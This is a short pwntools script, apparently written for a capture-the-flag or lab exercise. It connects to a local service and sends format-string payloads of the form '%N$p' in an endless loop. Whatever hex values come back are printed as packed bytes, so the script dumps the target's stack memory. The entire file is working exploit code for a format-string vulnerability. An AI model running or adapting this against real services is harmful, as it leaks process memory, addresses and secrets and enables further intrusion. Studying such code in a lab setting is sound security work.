from pwn import *
context.log_level = 'error'


def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()


i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1
